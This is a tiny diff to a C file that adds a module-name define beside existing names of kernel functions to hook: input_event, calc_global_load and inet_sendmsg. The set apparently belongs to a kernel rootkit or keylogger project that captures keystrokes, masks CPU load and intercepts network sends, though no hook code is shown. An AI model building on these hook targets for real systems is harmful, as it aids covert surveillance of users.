@@ -10,6 +10,9 @@
 
 #include "headers.h"
 
+#define MODULE_NAME "proj"
+#define MODULE_NAME_LENGTH 4
+
 #define HOOK_INPUT_EVENT "input_event"
 #define HOOK_CPU_USAGE "calc_global_load"
 #define HOOK_SEND_MESSAGE "inet_sendmsg"
